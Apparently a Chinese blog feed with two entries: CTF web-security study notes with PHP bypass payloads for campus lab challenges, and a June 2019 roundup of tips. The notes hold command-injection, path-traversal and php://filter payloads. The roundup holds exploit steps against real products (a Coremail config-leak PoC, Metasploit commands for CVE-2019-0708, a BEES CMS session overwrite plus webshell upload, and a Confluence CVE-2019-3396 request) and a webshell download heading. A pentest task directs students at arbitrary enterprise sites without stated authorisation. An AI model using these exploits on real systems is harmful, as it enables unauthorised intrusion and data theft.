]]])[!+[]+!+[]+[+[]]] chrome控制台解密 day03–7iny前言以下内容以web安全为主，Danie1整理的内网地址为实验室靶场环境，三康庙职业技术学院的同学可在校园网环境下访问。不可访问的同学理解原理学习即可 OWASP TOP 10漏洞思维导图2017版TOP10思维导图 TOP10漏洞介绍A1 注入 Injection Web安全头号大敌。注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。注入漏洞通常能SQL查询、LDAP查询、OS命令、程序参数等中出现 A2 失效的身份认证和会话管理 Broken Authentication and Session Management 与认证和会话管理相关的应用程序功能往往得不到正确管理，这就导致攻击者破坏密码、密匙、会话令牌或利用实施漏洞冒充其他用户身份。 A3 跨站脚本-XSS XSS的出现时间跟SQL差不多，是最普遍的web应用安全漏洞。当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当验证或转译，就会导致跨站脚本漏洞。XSS允许攻击者在受害者的浏览器中执行脚本，这些脚本可以劫持用户会话，破坏网站，或将用户重定向到恶意站点。 A4 不安全的直接对象引用 Insecurity Direct Object Reference 当开发人员公开对内部实现对象(如文件、目录或数据库键)的引用时，就会出现直接对象引用。如果没有访问控制检查或其他保护，攻击者可以操纵这些引用来访问未经授权的数据。 A5 安全配置错误 Security Misconfiguration 良好的安全性需要为应用程序、框架、应用服务器、web服务器、数据库服务器和平台定义和部署安全配置。默认值通常是不安全的。另外，软件应该保持更新。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。 A6 敏感信息泄露 Sensitive Data Exposure 保护与加密敏感数据已经成为网络应用的最重要的组成部分。最常见的漏洞是应该进行加密的数据没有进行加密。使用加密的情况下常见问题是不安全的密钥和使用弱算法加密。 A7 缺少功能级访问控制 大多数web应用程序在实现UI中可见的功能之前，都要验证功能级别的访问权限。但是，当访问每个函数时，应用程序需要在服务器上执行相同的访问控制检查。如果请求没有得到验证，攻击者将能够伪造请求，以便在没有适当授权的情况下访问功能。 A8 跨站请求伪造 CSRF 利用了网站允许攻击者预测特定操作的所有细节这一特点。由于浏览器自动发送会话cookie等认证凭证，导致攻击者能够创建恶意的web页面来伪造请求。这些伪造的请求很难和合法的请求区分开。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。 A9 使用含有已知漏洞的组件 开发人员使用的组件也会含有漏洞，这些漏洞能够被自动化工具发现和利用。然后攻击者根据需要定制攻击代码并实施攻击。 A10 未验证的重定向和转发 应用程序经常将用户重定向到其他网页，或以类似的方式进行内部转发。当目标网页是通过一个未验证的参数来指定时，就容易被攻击者利用。攻击者通过诱使受害人去点击未经验证的重定向链接，从而利用不安全的转发绕过安全检测。攻击者通过重定向可以试图安装恶意软件或者诱使受害人泄露密码等敏感信息，通过转发可以绕过访问控制。 详细介绍 sql注入简介在owasp发布的top 10漏洞里面，注入漏洞一直是危害排名第一，其中数据库注入漏洞是危害最大也是最受关注的漏洞。 当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄露。 教程推荐 看雪图书 1、sql注入的原理与分类 2、盲注 3、DVWA SQL Injection分析与利用 4、DVWA SQL Injection (Blind)分析与利用 5、Sqlmap盲注利用 6、防范sql注入 sqlmap安装sqlmap的使用需要python环境 1.python下载：官网 2.sqlmap下载：官网 1.将下载的SQLMAP安装包解压到文件夹sqlmap中，并拷贝到 Python27 安装目录下 2.在文件夹下创建sqlmap.bat ,内容为cmd.exe，创建桌面快捷方式 sqlmap作用1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，读取哪些数据 sqlmap支持五种不同的注入模式： 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。 sqlmap支持的数据库有： MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB 测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。 可以设定HTTP(S)请求的并发数，来提高盲注时的效率。 如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。 共有七个等级，默认为1： 0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。 如果你想看到sqlmap发送的测试payload最好的等级就是3。 更详细介绍参考博客 sqlmap基本操作 检测注入点 sqlmap.py -u url 所有数据库信息 sqlmap.py -u url –dbs 当前数据库信息 sqlmap.py -u url –current-db 指定库名列出所有表 sqlmap.py -u url -D 库名 –table 指定库名表名列出所有字段 sqlmap.py -u url -D 库名 -T 表名 –columns 指定库名表名字段dump sqlmap.py -u url -D 库名 -T 表名 -C 字段1,字段2 –dump CTF中的SQL注入1.练习总结博客：站点 2.简单sql注入3：writeup XSS攻击介绍CSS（Cross Site Scripting，跨站脚本攻击），为了和层叠样式表（Cascading Style Sheet，CSS）区分，所以安全领域改为叫XSS。XSS攻击能让攻击者在受害者的浏览器中执行js脚本，并劫持用户会话、破坏网络或将用户重定向到其他恶意的站点。 XSS的分类1. 反射型XSS所谓反射型XSS，就是简单用户输入的数据‘反射’给浏览器。也就是说，黑客我那个网需要有事用户‘点击’一个恶意链接，才能攻击。这其实是比较被动的。 2. 存储型XSS存储型XSS会把用户输入的数据‘存储’在服务器端。当访问数据库数据时，从数据库取出数据，并由HTML显示，这时导致了XSS的产生。 比如黑客将恶意js脚本写在一个博客中，下次任何人访问这个博客，都会在他们的浏览器中执行这段恶意js脚本。导致‘Cookie劫持’等。 3. DOM型XSS首先是关于DOM节点：整个文档是一个文档节点 从每个 XML 标签是一个元素节点 包含在 XML 元素中的文本是文本节点 每一个 XML 属性是一个属性节点 注释属于注释节点。 HTML 文档中的所有内容都是节点： 整个文档是一个文档节点 每个 HTML 元素是元素节点 HTML 元素内的文本是文本节点 每个 HTML 属性是属性节点 注释是注释节点 和反射型XSS类似，但是这类XSS执行脚本的位置与反射型XSS不同，是修改了页面的DOM节点而造成了恶意js脚本的执行。 总结 XSS类型 反射型 存储型 DOM型 触发过程 正常用户访问携带XSS的url 1.黑客构造XSS脚本2.用户访问有XSS脚本的网站 正常用户访问携带XSS的url 存储位置 url 数据库 url 谁来输出 后端web 后端web 前端JS 输出位置 HTML响应 HTML响应 动态生成的DOM节点 XSS在CTF中的运用XSS在CTF中主要用于盗取Cookie和Session，然后利用cookie,做一些其他的事情，但是这是有CSP的，一般会考察XSS绕过(bypass)的能力。 另外还会涉及到XSS,CSRF，SSRF的综合应用。 再者，就是利用XSS漏洞，进行js脚本注入。 参考文章1.XSS原理&amp;复现2.XSS攻击手段&amp;在CTF中的运用 day03–Danie1php代码审计extract变量覆盖该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。 123456789101112131415161718&lt;?phperror_reporting(0);$flag='xxx'; extract($_GET); if(isset($shiyan)) &#123; $content=trim($flag); if($shiyan==$content) &#123; echo'ctf&#123;xxx&#125;'; &#125; else &#123; echo'Oh.no'; &#125; &#125;?&gt; file_get_contents — 将整个文件读入一个字符串。 trim — 去除字符串首尾处的空白字符（或者其他字符）。 题目环境 http://172.16.43.117/php_bugs-master/01.php payload http://172.16.43.117/php_bugs-master/01.php?shiyan=1&amp;flag=1 多重加密 12$login = unserialize(gzuncompress(base64_decode($requset['token'])));if($login['user'] === 'ichunqiu')&#123;echo $flag;&#125; 本地编写 123456&lt;?php$arr = array(['user'] === 'ichunqiu');$token = base64_encode(gzcompress(serialize($arr)));print_r($token);?&gt; 运行得到 即是所需的payload ereg正则%00截断123456789101112131415161718192021222324252627&lt;?php $flag = "flag";if (isset ($_GET['password'])) &#123; if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置 &#123; die('Flag: ' . $flag); &#125; else &#123; echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); &#125; &#125; else &#123; echo '&lt;p&gt;Invalid password&lt;/p&gt;'; &#125; &#125; ?&gt; ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 题目 http://172.16.43.117/php_bugs-master/05.php 限制条件 题中ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母 strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写） 解决方法 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 科学计数法绕过长度限制 payload http://172.16.43.117/php_bugs-master/05.php?password=1e9%00*-* strcmp比较字符串123456789101112&lt;?php$flag = "flag";if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; &#125;?&gt; 可以使用数组绕过 int strcmp ( string $str1 , string $str2 )// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL,而判断使用的是==，NULL==0是 bool(true) 题目 http://172.16.43.115/1.php payload： ?a[]=1 sha()函数比较绕过12345678910111213141516&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt; 限制条件 传入的name参数和password参数不能相同 但是它们的sha1值要相同 解决方法 ===会比较类型，比如boolsha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型 题目： http://172.16.43.117/php_bugs-master/07.php payload： ?name[]=1&amp;password[]=2 SESSION验证绕过12345678910111213&lt;?php$flag = "flag";session_start(); if (isset ($_GET['password'])) &#123; if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p&gt;Wrong guess.&lt;/p&gt;';&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 限制条件 传入的password参数要等于session中的password值 解决方法 删除session 题目： http://172.16.43.115/2.php payload http://172.16.43.115/2.php?password= urldecode二次编码绕过12345678910111213&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125;?&gt; 题目：http://172.16.43.117/php_bugs-master/10.php payload http://172.16.43.117/php_bugs-master/10.php?id=%2568ackerDJ X-Forwarded-For绕过指定IP地址123456789101112131415161718192021&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER["HTTP_CLIENT_IP"])) $cip = $_SERVER["HTTP_CLIENT_IP"];else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];else if(!empty($_SERVER["REMOTE_ADDR"])) $cip = $_SERVER["REMOTE_ADDR"];else $cip = "0.0.0.0";return $cip;&#125;$GetIPs = GetIP();if ($GetIPs=="1.1.1.1")&#123;echo "Great! Key is *********";&#125;else&#123;echo "错误！你的IP不在访问列表之内！";&#125;?&gt; 题目：http://172.16.43.117/php_bugs-master/12.php 解决方法 HTTP头添加X-Forwarded-For:1.1.1.1 使用forefox插件SIMPLE MODIFY HEADERS md5加密相等绕过1234567891011121314&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;#if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo "nctf&#123;*****************&#125;#";&#125; else &#123; echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 分析 $md51=QNKCDZO的MD5编码 $md52=传入的参数a的MD5编码 $a 不等于’QNKCDZO’ 并且 $md51等于 $md52（也就是两个不同的字符串md5值要相同） 将QNKCDZO进行MD5加密，密文为0e830400451993494058024219903391，发现密文为0e开头，PHP在进行比较运算时，0e开头字符串都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可 12md5(&apos;240610708&apos;); // 0e462097431906509019562988736854 md5(&apos;QNKCDZO&apos;); // 0e830400451993494058024219903391 题目: http://172.16.43.117/php_bugs-master/13.php payload: ?a=240610708 strpos数组绕过NULL与ereg正则%00截断1234567891011121314&lt;?php$flag = "flag"; if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; ?&gt; 分析 既要是纯数字,又要有#biubiubiu ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 注意：需将#编码 题目：http://172.16.43.117/php_bugs-master/15.php payload：?nctf=1%00%23biubiubiu md5()函数===使用数组绕过123456789101112&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123; if ($_GET['username'] == $_GET['password']) print 'Your password can not be your username.'; else if (md5($_GET['username']) === md5($_GET['password'])) die('Flag: '.$flag); else print 'Invalid password';&#125;?&gt; 分析 若为md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])则可以构造：?username=QNKCDZO&amp;password=240610708因为==对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了也可以使用数组绕过?username[]=1&amp;password[]=2 但此处是===，只能用数组绕过，PHP对数组进行hash计算都会得出null的空值?username[]=1&amp;password[]=2 题目： http://172.16.43.117/php_bugs-master/18.php payload： ?username[]=1&amp;password[]=2 ereg()函数strpos() 函数用数组返回NULL绕过12345678910111213&lt;?php $flag = "flag&#123;123456&#125;"; if (isset ($_GET['password'])) &#123; if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; &#125; ?&gt; 分析 方法一：ereg()正则函数可以用%00截断?password=1%00-- 方法二：将password构造一个数组，传入之后，ereg是返回NULL的，===判断NULL和 FALSE，是不相等的，所以可以进入第二个判断，而strpos处理数组，也是返回NULL，注意这里的是!==，NULL!==FALSE,条件成立，拿到flag?password[]= 题目： http://172.16.43.117/php_bugs-master/19.php payload：?password=a%00-- 弱类型整数大小比较绕过123456789101112&lt;?phperror_reporting(0);$flag = "flag&#123;test&#125;";$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL; if($temp&gt;1336)&#123; echo $flag;&#125; ?&gt; 分析 不能是数字，且又要大于1336，看上去是矛盾的 解决 ​ 利用PHP弱类型的一个特性，当一个整型和一个其他类型行比较的时候，会先把其他类型intval再比。如果输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag 题目：http://172.16.43.117/php_bugs-master/22.php payload：?password=123456a 其他常见web类型 命令执行参考 命令连接符： 123； 命令1；命令2 多个命令顺序执行&amp;&amp; 命令1&amp;&amp;命令2 当命令1执行成功，命令2才会执行 。命令1执行不成功时，命令2不会执行|| 命令1||命令2 当命令1执行不成功，命令2才会执行。命令1执行成功时，命令2不会执行 1234567891011&lt;?phpif(isset($_GET[1]))&#123; if(strlen($_GET[1])&lt;8)&#123; echo shell_exec($_GET[1]); &#125;&#125;else&#123; show_source(__FILE__);&#125;?&gt; 分析 传入参数1，并且长度不能大于8 题目 http://172.16.43.115:18099/exec.php payload ?1=cat * 12345678910111213141516171819202122232425262728293031323334&lt;?php // Get input $target = $_REQUEST[ 'ip' ]; // var_dump($target); $target=trim($target); // var_dump($target); // Set blacklist $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '|' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // var_dump($target); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 1 ' . $target ); &#125; echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";highlight_file(__FILE__);?&gt; 分析 加入了黑名单，但是黑名单漏了%0a 题目 http://172.16.43.115/exec/index.php payload: ?ip=8.8.8.8%0acat flag.php git源码泄露 题目 http://172.16.43.115:19002/ 工具 ：GitHack 用法：python GitHack.py http://www.example.com/ 文件包含漏洞 PHP中文件包含函数有以下四种： require() require_once() include() include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 题目 http://172.16.43.115/include/index.php payload ：?file=../../../../../home/flag 题目 http://4.chinalover.sinaapp.com/web7/index.php php伪协议 方法：读index.php http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php base64解码后 1234567891011121314151617&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 简单脚本辅助 题目 http://172.16.43.117/web/08/index.php 123456789101112131415161718#!/usr/bin/python#-*-coding:utf-8-*-import requestsimport reurl = 'http://172.16.43.117/web/08/index.php's = requests.Session()html = s.get(url).contentreg = r'(.*)&lt;/p&gt;'res = re.findall(reg,html)payload = &#123;'result':eval(res[0])&#125;flag = s.post(url,data=payload)print flag.content day03–yiyangqianxixxxx前言此内容为严老板编写总结，7iny整理。仅供学习参考，请及时向漏洞平台上报漏洞 渗透测试要求 确立渗透测试目标 ：省企业网站，或任意学习网站。 确立渗透测试范围：隶属于该网站域名下所有网站均可。 渗透测试手段：通过信息搜集得到网站的主要信息，来对其进行各种漏洞的测试，包括但不限于sql注入、xss、信息泄露。考虑到的攻击手段要全面，只要有可能存在漏洞的地方就去尝试。 选择的目标若未找到漏洞，可只记录信息搜集过程，并且将可能存在漏洞点的（你认为不安全的地方）标注出来。可多选择几个目标进行尝试，但在渗透过程中要进行多方面考虑，尝试每一个可能的攻击面，若找到漏洞甚至getshell不得对系统进行任何破坏，一切也测试为目的。渗透过程中也要注意保护系统，对服务器的扫描等行为要确保不会影响服务。 详细记录整个过程，把每个值得记录的地方都写下来。并向相关漏洞平台上报漏洞 流程信息收集在拿到一个网站的时候，首先是对这个网站要有一个比较全面的了解，就是对这个网站进行信息收集。在信息收集阶段，一般要收集这个网站的IP地址信息，是否使用CDN，使用哪种语言开发，中间件是什么 IP端口扫描端口发现的目的是查看是否有高危端口，比如135/445/3389或者常见的数据库端口等 比如，如果存在445端口，我们就可以测试是否存在永恒之蓝漏洞，在端口发现阶段，如果存在像7001或者8080这样的端口的情况，我们就要看下这些端口是在运行哪些服务 目录扫描对网站目录的扫描，我们可以观察是否存在网站后台管理 如果存在的话，可以尝试弱口令登录 如果尝试多次登录没有锁定，也可以尝试简单的口令爆破，因为现场测试时间有限，长时间的爆破是不可能的 主机层漏洞主机层的漏洞就是看端口开放情况，判断开放的服务，然后测试是否有漏洞，比如溢出漏洞，反序列化漏洞 中间件漏洞中间件漏洞比较简单，像weblogic反序列化，还有就是使用中间件部署web木马，直接拿服务器权限另外还有一些框架的漏洞，比如Struts2的漏洞。这些漏洞都是可以直接使用工具进行检测的 常见漏洞xss漏洞，sql注入漏洞，还有一些越权等逻辑漏洞 比如XSS漏洞，一般存在于搜索框中或者注册信息等地方当发现有搜索框或者注册信息或者发布消息，需要输入内容，且输入消息会返回到页面让读者查看的时候，就需要测试一下是否存在xss漏洞当然，我们还需要联想到，当我们看到搜索框的时候，我们需要测试一下搜索的内容是否是从数据库中去调取的，如果是的话，可能也会存在SQL注入的可能上传漏洞一般配合解析漏洞使用，如果服务器端与前端都没有对上传格式进行限制，那么我们可以直接上传webshell，拿服务器权限如果网站对上传格式有限制，我们需要抓包对文件类型进行修改，然后上传，验证是前端还是服务器端做的限制，如果是前端做的限制就可以改包上传了，上传后注意观察返回包的内容，是否有文件上传的路径与上传后的文件名当网站是使用iis6.0搭建的网站时可以使用IIS6.0特有的两个文件解析漏洞进行测试 SQL注入漏洞常见的存在于带参数链接或者POST数据包 类似于xxx.jsp?id=xxx或者像登录时使用POST请求方式传输用户名和密码，至于验证是否存在SQL注入 工具在测试的过程中，一般会使用到SQLmap，wvs，kali，k8，菜刀，webshell，御剑，Nessus等还有一些反序列化的检测工具和脚本，这些可以在GitHub上，或其他地方找到端口扫描工具可以使用nmap，Windows下的zmap（其实就是nmap），常用参数可以上网搜一下，比较详细远程连接工具可以使用putty，或者crt数据库连接工具可以使用Navicat 强调渗透的思路的话，一般就是信息收集，整理，利用，测试（验证），获取权限，到此为止，禁止拿数据或者对用户网络造成影响剩下的就是对工具的熟练使用以及丰富自己的渗透思路，能力大的可以从代码层面去发现漏洞，说不定会有意外收获]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一九年六月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%85%AD%E6%9C%88.html</url>
    <content type="text"><![CDATA[hexo倒腾问题 404页面不能正常显示使用官方给的代码时 123456789101112131415161718&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="content-type" content="text/html;charset=utf-8;"/&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /&gt; &lt;meta name="robots" content="all" /&gt; &lt;meta name="robots" content="index,follow"/&gt; &lt;link rel="stylesheet" type="text/css" href="https://qzone.qq.com/gy/404/style/404style.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;script type="text/plain" src="http://www.qq.com/404/search_children.js" charset="utf-8" homePageUrl="/" homePageName="回到我的主页"&gt; &lt;/script&gt; &lt;script src="https://qzone.qq.com/gy/404/data.js" charset="utf-8"&gt;&lt;/script&gt; &lt;script src="https://qzone.qq.com/gy/404/page.js" charset="utf-8"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 本地环境正常显示，不过推到github后就成下图所示了 原因在知乎上看到有人说出现该问题的原因是github个人页强制使用https协议，而上面给的代码是http的，因此无法加载样式表。 解决方法方法1使用购买的域名指向自己的github个人主页，增加CNAME文件，然后调用公益404页面不会出现混合内容那个问题。（还是需要开启https协议！！！！！） 方法2使用以下代码达到相同的效果 ps:返回主页,后面链接改成自己的即可 12345678910&lt;!DOCTYPE html&gt;&lt;html lang="zh-cn"&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" homePageName="返回主页" homePageUrl="https://7iny.jxustctf.top"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 参考文章 更换背景我们直接在 NEXT 预留的自定义样式文件 “themes/next/source/css/_custom/custom.styl” 中添加自己的样式即可 为了让背景图平铺窗口我把scheme值改成了Muse 菜单栏透明度设置后搜索功能不能正常使用，我注释掉了那部分代码 123456789101112131415161718body &#123; background: url(https://raw.githubusercontent.com/N407PengYuYan/img/master/img/index.png); background-size: cover; background-repeat: no-repeat; background-attachment: fixed; background-position: 50% 50%;&#125;// 修改主体透明度.main-inner &#123; background: #fff; opacity: 0.8;&#125;// 修改菜单栏透明度.header-inner &#123; opacity: 0.9;&#125; 参考文章 实用方法win10添加网络打印机控制面板-&gt;查看方式按小图标-&gt;凭据管理器-&gt;添加Windows凭据-&gt;输入网络打印机的IP地址,用户密码-&gt;命令行输入目标IP地址\\xxx.xxx.xx.xxx 参考文章 校园宽带PPPOE拨号路由器登陆选择宽带拨号电信宽带：学号@telecom+密码（默认密码：身份证号后六位）移动宽带：学号@cmcc+密码（默认密码：身份证号后六位）联通宽带：学号@unicom+密码（默认密码：身份证号后六位） 参考文章 免费接码平台123456789101112131415161718192021222324252627282930313233343536373839国内免费接码平台 https://sms.cm https://www.pdflibr.com https://www.becmd.com http://www.smszk.com国外免费接码平台 https://zh.mytrashmobile.com（中文） https://ch.freephonenum.com（中文） SMSReceiveFree：https://smsreceivefree.com Receive SMS Online for FREE：https://www.receive-sms-online.info Receive a SMS Online：https://receive-a-sms.com Free SMS Numbers Online：https://smsnumbersonline.com Receive SMS online for Free：https://sms-online.co/receive-free-sms Receive-SMS：https://receive-sms.com Receive FREE SMS online：http://receivefreesms.com RECEIVE SMS ONLINE：https://www.receivesmsonline.net Free Online Phone：https://www.freeonlinephone.org Receive SMS Online：http://receive-sms-online.com TextNow：https://www.textnow.com Textfree：https://www.pinger.com/text-free/ SELLAITE：http://sms.sellaite.com/ Twilio：https://www.twilio.com/ https://receive-sms.com/ http://receive-sms-online.com/ http://sms.sellaite.com/ http://hs3x.com/ http://receivefreesms.net http://receivesmsonline.in http://www.receive-sms-now.com https://sms-receive.net https://www.receivesms.net http://www.freesmsverifications.com http://receiveonlinesms.biz http://receivesmsverification.com https://www.receivesms.co http://receiveonlinesms.com 参考文章 借助插件科学上网有时候代理会被大面积封锁，可是我们又需要进行学习，那么我们可以用第三方插件来满足我们的搜索需求 Ghelper源码安装chrome插件 1.打开你的Chrome浏览器的 更多工具&gt;扩展程序页面.或者直接在网址输入: chrome://extensions/2.这个页面点击 “添加已解压的扩展程序”3.选择本次下载包里的 ghelper_source 目录4.确认后就行了. 官网下载地址 木马下载asp木马 Coremail 0day 敏感文件泄露漏洞 POC: /mailsms/s?func=ADMIN:appState&amp;dumpConfig=/ 通过域名或者IP等地址+POC即可获取目标邮件服务器配置文件，配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。 参考文章 2.apiws http://host/apiws/services/ http://host/apiws/services/API?wsdl 参考文章 cnvd通告 漏洞CVE-2019-0708影响：该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows xp * 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。 kali依次执行验证 1234msfconsoleuse auxiliary/scanner/rdp/cve_2019_0708_bluekeepset RHOSTS x.x.x.xexploit BEES企业网站管理系统漏洞1.漏洞地址http://host/mx_form/mx_form.php?id=2 1用火狐里面的firebug插件用post参数，覆盖session值，之后便可直接登录后台：_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=100000000000000000000000000000000000 2.执行之后访问http://host/admin/admin.php3.点击内容管理—&gt;上传照片管理—&gt;修改4.上传图片马，用burpsuite拦截将jpg改为php，即可绕过上传限制 CVE-2019-3396漏洞描述中指出Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。 漏洞分析参看文章 Burp Suit复现 123456789101112POST /rest/tinymce/1/macro/preview HTTP/1.1Host: x.x.x.xAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeReferer:http://x.x.x.x/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;Content-Type: application/json; 